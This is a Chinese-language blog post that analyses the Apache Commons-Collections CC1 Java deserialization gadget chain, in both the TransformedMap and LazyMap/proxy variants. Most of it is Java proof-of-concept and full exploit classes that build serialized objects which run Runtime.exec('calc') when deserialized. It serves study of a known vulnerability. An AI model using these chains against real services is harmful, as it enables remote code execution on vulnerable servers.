---
layout: post
title: Commons-Collection CC1链
tags: Java
---

# 链分析

入口点是transformer接口

```
public interface Transformer {
    public Object transform(Object input);
}
```

查找实现类，找到InvokerTransformer类重写了transform方法，反射接收对象反射调用，方法名，参数类型参数值等都可以控制

```
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}



public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

## POC

```

package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import java.lang.reflect.Method;

public class CC1Test {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException {

        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execmethod = c.getMethod("exec", String.class);
//        execmethod.invoke(r,"calc");
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
    }
}
```

![1726477865073.jpg](\images\posts\Commons-Collection CC1链\1726477865073.jpg)

**查找调用transform()的类的方法**

找到TransformedMap类下的checkSetValue方法

checkSetValue方法和构造函数

```

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}


protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

protect权限，只能内部类访问,往上找decorate为public，且valueTransformer可控。

```

public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}


protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

通过该方法给他传值，再触发checkSetValue()方法即可

```
    Runtime r = Runtime.getRuntime();
//    Class c = Runtime.class;
//    Method execmethod = c.getMethod("exec", String.class);
//    execmethod.invoke(r,"calc");
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
    HashMap<Object,Object> map = new HashMap<>();
    Map<Object,Object> decorate = TransformedMap.decorate(map, null, invokerTransformer);   //只需赋值valueTransformer
```

**查找调用checkSetValue()的方法**

![1726477998136.jpg](\images\posts\Commons-Collection CC1链\1726477998136.jpg)

Map中有setValue方法，MapEntry重写AbstractMapEntryDecorator的setValue方法,AbstractMapEntryDecorator,AbstractMapEntryDecorator引入Map.Entry接口，所以进行Map遍历，就可以调用setValue()

![1726478031756.jpg](\images\posts\Commons-Collection CC1链\1726478031756.jpg)

```
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException {

        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execmethod = c.getMethod("exec", String.class);
//        execmethod.invoke(r,"calc");
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("admin","admin123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);   //只需赋值valueTransformer
        for (Map.Entry entry:transformedMap.entrySet()){
            entry.setValue(r);
        }

    }
}
```

**查找调用setValue()的方法AnnotationInvocationHandlerreadObject()里面调用了该方法**

![1726478115067.jpg](\images\posts\Commons-Collection CC1链\1726478115067.jpg)

找到构造函数

![1726478143936.jpg](\images\posts\Commons-Collection CC1链\1726478143936.jpg)

memberValues可控，定义类默认为default，只能通过反射调用

```
public class CC1Test {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException {

        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execmethod = c.getMethod("exec", String.class);
//        execmethod.invoke(r,"calc");
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("admin","admin123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);   //只需赋值valueTransformer
//        for (Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);
        serialize(o);
        unserialize("CCTest1.txt");


    }
    public static void serialize(Object obj) throws IOException {
        //将序列化后保存到ser.bin中
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

解决未弹计算器问题

**Runtime没有序列化**

原型类Class存在serializable接口，可以序列化

```
        Method getRuntiMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntiMethod);
        Method execMethod = (Method) new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);


//        Class c = Runtime.class;
//        Method getRuntiMethod = c.getMethod("getRuntime", null);
//        Runtime r = (Runtime) getRuntiMethod.invoke(null, null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "calc");
```

![1726478200659.jpg](\images\posts\Commons-Collection CC1链\1726478200659.jpg)

使用ChainedTransformer

![1726478230064.jpg](\images\posts\Commons-Collection CC1链\1726478230064.jpg)

```
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException {

//        Runtime r = Runtime.getRuntime();

//        Method getRuntiMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntiMethod);
//        Method execMethod = (Method) new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
    }
```

![1726478279301.jpg](\images\posts\Commons-Collection CC1链\1726478279301.jpg)

**setValue无法执行问题**

```
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException {

//        Runtime r = Runtime.getRuntime();

//        Method getRuntiMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntiMethod);
//        Method execMethod = (Method) new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);
//        Class c = Runtime.class;
//        Method getRuntiMethod = c.getMethod("getRuntime", null);
//        Runtime r = (Runtime) getRuntiMethod.invoke(null, null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "calc");


//        Class c = Runtime.class;
//        Method execmethod = c.getMethod("exec", String.class);
//        execmethod.invoke(r,"calc");
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("admin","admin123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);   //只需赋值valueTransformer
//        for (Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);
        serialize(o);
        unserialize("CCTest1.txt");


    }
```

两个if语句问题

![1726478322937.jpg](\images\posts\Commons-Collection CC1链\1726478322937.jpg)

断点调试为null值，未过if语句

![1726478345663.jpg](\images\posts\Commons-Collection CC1链\1726478345663.jpg)

获取一个注解类型的 AnnotationType 实例，并从中提取注解成员的类型

![1726478373808.jpg](\images\posts\Commons-Collection CC1链\1726478373808.jpg)

把Override换成有值的注解Target

![1726478421260.jpg](\images\posts\Commons-Collection CC1链\1726478421260.jpg)

![1726478525859.jpg](\images\posts\Commons-Collection CC1链\1726478525859.jpg)

**setValue值无法控制**

ConstantTransformer返回一个常量可以利用他来避免readObject中的修改。

![1726478566150.jpg](\images\posts\Commons-Collection CC1链\1726478566150.jpg)

![1726478587565.jpg](\images\posts\Commons-Collection CC1链\1726478587565.jpg)

## EXP

```
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","admin123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);   //只需赋值valueTransformer

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("CCTest1.txt");


    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

![1726478660977.jpg](\images\posts\Commons-Collection CC1链\1726478660977.jpg)

# LazyMap

对比之前CC1链从此处开始不同

![1726478888068.jpg](\images\posts\Commons-Collection CC1链\1726478888068.jpg)

LazyMap.get()

![](\images\posts\Commons-Collection CC1链\1726478955464.jpg)

这里的factory可控,factory传chainedTransformer对象,map

![](\images\posts\Commons-Collection CC1链\1726478967711.jpg)

构造一下EXP

```

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","admin123");
        Map<Object,Object> layzMap = LazyMap.decorate(map, chainedTransformer);
        layzMap.get("机器猫");
```

![](\images\posts\Commons-Collection CC1链\1726478981873.jpg)

AnnotationInvocationHandler.invoke()

![](\images\posts\Commons-Collection CC1链\1726479036069.jpg)

get在invoke方法里面

AnnotationInvocationHandler实现了InvocationHandler接口，可用动态代理

![](\images\posts\Commons-Collection CC1链\1726479063414.jpg)

Proxy.newProxyInstance()里面如果传了AnnotationInvocationHandler对象，创建出来的代理对象不管调什么方法都会进invoke()方法。

两个if方法

![](\images\posts\Commons-Collection CC1链\1726479091186.jpg)

```
//不能调用equals方法
if (member.equals("equals") && paramTypes.length == 1 &&
    paramTypes[0] == Object.class)
    return equalsImpl(args[0]); 
//要调用无参方法
if (paramTypes.length != 0)
	throw new AssertionError("Too many parameters for an annotation method");
```

此处刚好存在无参方法

![](\images\posts\Commons-Collection CC1链\1726479104616.jpg)

memberValues也可控，传一个lazymap

![](\images\posts\Commons-Collection CC1链\1726479117003.jpg)

## EXP

```

package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMap {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","admin123");
        Map<Object,Object> layzMap = LazyMap.decorate(map, chainedTransformer);
//        layzMap.get("机器猫");
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,layzMap);
        Map o = (Map) Proxy.newProxyInstance(layzMap.getClass().getClassLoader(), layzMap.getClass().getInterfaces(), invocationHandler);
        Object o1 = annotationInvocationHandlerConstructor.newInstance(Override.class, o);
        serialize(o1);
        unserialize("CCTest1.txt");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}


```

![1726479155941.jpg](\images\posts\Commons-Collection CC1链\1726479155941.jpg)